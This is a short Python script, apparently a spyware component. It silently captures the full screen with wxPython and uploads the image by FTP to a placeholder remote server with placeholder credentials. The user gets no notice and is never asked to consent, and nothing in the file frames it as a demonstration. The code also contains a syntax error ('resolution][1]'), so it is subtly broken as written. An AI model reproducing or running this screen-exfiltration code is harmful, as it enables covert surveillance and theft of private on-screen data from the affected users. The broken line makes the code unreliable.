import wx
import os
import ftplib

window = wx.App()
screen = wx.ScreenDC()
resolution = screen.GetSize()
bitmap = wx.Bitmap(resolution[0],resolution][1])
memoryMap = wx.MemoryDC(bitmap)
memoryMap.Blit(0,0,resolution[0],resolution[1],screen,0,0)
del memoryMap

bitmap.SaveFile("ScreenShot.png", wx.BITMAP_TYPE_PNG)

FTPSession = ftplib.FTP("[FTP SERVER IP]", "[USERNAME]", "[PASSWORD]")
SnapFile = open("ScreenShot.png","rb")
FTPSession.storbinary("STOR /tmp/ScreenShot.png", SnapFile)

SnapFile.close()
FTPSession.quit()